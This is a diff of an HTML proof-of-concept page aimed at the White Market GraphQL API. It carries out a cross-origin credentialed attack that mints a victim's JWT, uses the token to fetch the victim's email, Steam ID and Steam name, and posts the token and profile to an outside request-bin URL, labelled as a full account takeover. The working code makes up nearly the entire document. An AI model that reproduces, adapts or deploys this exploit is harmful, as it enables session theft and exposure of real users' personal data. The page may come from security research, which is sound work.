@@ -1,22 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head><title>White Market Debug</title></head>
+<head><title>White Market - Final Attack Test</title></head>
 <body>
-<h1>CORS Attack Debug</h1>
-<button onclick="testNow()">Test CORS Now</button>
+<h1>FINAL ATTACK TEST</h1>
+<button onclick="attack()" style="padding: 20px; font-size: 18px; background: red; color: white; border: none; cursor: pointer;">
+    🚨 TEST FULL ATTACK NOW 🚨
+</button>
 <pre id="output"></pre>
 
 <script>
 const output = document.getElementById('output');
 const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';
 
-async function testNow() {
-    output.textContent = 'Testing CORS attack...\n\n';
+async function attack() {
+    output.textContent = '=== ATTACKING ===\n\n';
+    
+    // Step 1: Try to generate JWT via auth_token mutation
+    output.textContent += 'Step 1: Attempting to steal refresh token and generate JWT...\n';
     
     try {
-        output.textContent += 'Step 1: Attempting to fetch user profile...\n';
-        
-        const response = await fetch('https://api.white.market/graphql/api', {
+        const jwtResponse = await fetch('https://api.white.market/graphql/api', {
             method: 'POST',
             credentials: 'include',
             headers: {
@@ -25,107 +28,96 @@ async function testNow() {
             },
             body: JSON.stringify({
                 query: `
-                    query PersonProfile {
-                        person: person_profile {
-                            id
-                            steamId
-                            email
+                    mutation AuthToken {
+                        auth_token {
+                            accessToken
                         }
                     }
                 `,
-                operationName: 'PersonProfile'
+                operationName: 'AuthToken'
             })
         });
         
-        output.textContent += `Response status: ${response.status}\n\n`;
+        const jwtData = await jwtResponse.json();
+        output.textContent += `Response: ${JSON.stringify(jwtData, null, 2)}\n\n`;
         
-        const data = await response.json();
-        output.textContent += 'Response data:\n';
-        output.textContent += JSON.stringify(data, null, 2) + '\n\n';
-        
-        if (data.data && data.data.person) {
-            output.textContent += '✅ SUCCESS - User is logged in!\n';
-            output.textContent += `Steam ID: ${data.data.person.steamId}\n`;
-            output.textContent += `User ID: ${data.data.person.id}\n\n`;
+        if (jwtData.data && jwtData.data.auth_token) {
+            output.textContent += '✅✅✅ SUCCESS! JWT STOLEN! ✅✅✅\n\n';
+            const jwt = jwtData.data.auth_token.accessToken;
+            output.textContent += `JWT: ${jwt}\n\n`;
             
-            // Exfiltrate
+            // Exfiltrate to RequestBin
             fetch(REQUESTBIN, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    attack: 'VICTIM_PROFILE_STOLEN',
-                    victim: data.data.person,
-                    timestamp: new Date().toISOString()
+                    attack: 'FULL_ACCOUNT_TAKEOVER_SUCCESS',
+                    jwt: jwt,
+                    timestamp: new Date().toISOString(),
+                    note: 'Persistent JWT stolen via CORS + token refresh cookie'
                 })
             });
             
-            output.textContent += 'Step 2: Attempting JWT generation...\n';
+            // Step 2: Use the JWT to fetch victim data
+            output.textContent += 'Step 2: Using stolen JWT to fetch victim profile...\n';
             
-            const jwtResponse = await fetch('https://api.white.market/graphql/api', {
+            const profileResponse = await fetch('https://api.white.market/graphql/api', {
                 method: 'POST',
-                credentials: 'include',
                 headers: {
                     'Content-Type': 'application/json',
+                    'authorization': `Bearer ${jwt}`,
                     'x-accept-language': 'en_US'
                 },
                 body: JSON.stringify({
                     query: `
-                        mutation AuthToken {
-                            auth_token {
-                                accessToken
+                        query PersonProfile {
+                            person: person_profile {
+                                id
+                                email
+                                steamId
+                                steamName
                             }
                         }
                     `,
-                    operationName: 'AuthToken'
+                    operationName: 'PersonProfile'
                 })
             });
             
-            const jwtData = await jwtResponse.json();
-            output.textContent += '\nJWT response:\n';
-            output.textContent += JSON.stringify(jwtData, null, 2) + '\n\n';
+            const profileData = await profileResponse.json();
+            output.textContent += `\nVictim Profile:\n${JSON.stringify(profileData, null, 2)}\n\n`;
             
-            if (jwtData.data && jwtData.data.auth_token) {
-                output.textContent += '✅ JWT STOLEN!\n';
-                output.textContent += `JWT: ${jwtData.data.auth_token.accessToken.substring(0, 100)}...\n`;
+            if (profileData.data && profileData.data.person) {
+                output.textContent += `✅ VICTIM IDENTIFIED:\n`;
+                output.textContent += `  Email: ${profileData.data.person.email}\n`;
+                output.textContent += `  Steam ID: ${profileData.data.person.steamId}\n`;
+                output.textContent += `  Steam Name: ${profileData.data.person.steamName}\n\n`;
                 
                 fetch(REQUESTBIN, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        attack: 'JWT_STOLEN',
-                        jwt: jwtData.data.auth_token.accessToken,
-                        victim_id: data.data.person.id,
+                        attack: 'VICTIM_DATA_EXFILTRATED',
+                        victim: profileData.data.person,
+                        jwt: jwt,
                         timestamp: new Date().toISOString()
                     })
                 });
-            } else if (jwtData.errors) {
-                output.textContent += '⚠️ JWT generation failed:\n';
-                jwtData.errors.forEach(err => {
-                    output.textContent += `  ${err.message}\n`;
-                });
-                output.textContent += '\n(User probably logged in via web, not Steam)\n';
             }
             
-        } else if (data.errors) {
-            output.textContent += '❌ API returned errors:\n';
-            data.errors.forEach(err => {
-                output.textContent += `  - ${err.message}\n`;
+            output.textContent += '\n🎯 ATTACK COMPLETE - FULL ACCOUNT TAKEOVER ACHIEVED 🎯\n';
+            
+        } else if (jwtData.errors) {
+            output.textContent += '❌ JWT generation failed:\n';
+            jwtData.errors.forEach(err => {
+                output.textContent += `  ${err.message}\n`;
             });
-        } else {
-            output.textContent += '❌ User not logged in\n';
+            output.textContent += '\n(You probably need to login via Steam first)\n';
         }
         
     } catch (e) {
-        output.textContent += `\n❌ ERROR: ${e.message}\n`;
-        output.textContent += `Stack: ${e.stack}\n`;
+        output.textContent += `❌ ERROR: ${e.message}\n`;
     }
 }
-
-// Auto-run test on page load
-window.onload = () => {
-    output.textContent = 'Page loaded. Testing in 2 seconds...\n';
-    setTimeout(testNow, 2000);
-};
 </script>
 </body>
 </html>
